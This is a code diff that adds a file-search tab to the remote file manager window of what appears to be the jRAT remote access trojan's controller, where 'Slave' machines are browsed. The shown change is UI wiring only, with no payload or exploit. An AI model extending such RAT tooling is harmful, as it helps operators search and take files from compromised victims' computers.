@@ -12,6 +12,7 @@ import javax.swing.JTabbedPane;
 import javax.swing.WindowConstants;
 
 import se.jrat.controller.Slave;
+import se.jrat.controller.ui.panels.PanelSearchFiles;
 import se.jrat.controller.ui.panels.PanelFileTransfers;
 import se.jrat.controller.ui.panels.PanelRemoteFiles;
 import se.jrat.controller.ui.panels.PanelRemoteFiles.RemoteFileTable;
@@ -20,6 +21,7 @@ import se.jrat.controller.ui.panels.PanelRemoteFiles.RemoteFileTable;
 public class FrameRemoteFiles extends BaseFrame {
 	
 	private RemoteFileTable remoteTable;
+	private PanelSearchFiles searchPanel;
 	
 	public static final Map<Slave, FrameRemoteFiles> INSTANCES = new HashMap<Slave, FrameRemoteFiles>();
 
@@ -39,7 +41,7 @@ public class FrameRemoteFiles extends BaseFrame {
 		setLayout(new BorderLayout(0, 0));
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteFiles.class.getResource("/icons/folder-tree.png")));
 
-		setTitle("File manager - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
+		setTitle("File Manager");
 
 		PanelRemoteFiles remoteFiles = new PanelRemoteFiles(slave);
 		remoteTable = remoteFiles.remoteTable;
@@ -47,9 +49,12 @@ public class FrameRemoteFiles extends BaseFrame {
 		JScrollPane scrollPane = new JScrollPane();
 		scrollPane.setViewportView(PanelFileTransfers.instance);
 		
+		searchPanel = new PanelSearchFiles(slave);
+		
 		JTabbedPane tabbedPane = new JTabbedPane();
 		tabbedPane.addTab("Files", remoteFiles);
 		tabbedPane.addTab("Transfers", scrollPane);
+		tabbedPane.addTab("Search", searchPanel);
 		
 		add(tabbedPane, BorderLayout.CENTER);	
 	}
@@ -60,6 +65,10 @@ public class FrameRemoteFiles extends BaseFrame {
 
 	public void exit() {
 		INSTANCES.remove(slave);
+	}
+
+	public PanelSearchFiles getSearchPanel() {
+		return searchPanel;
 	}
 
 }
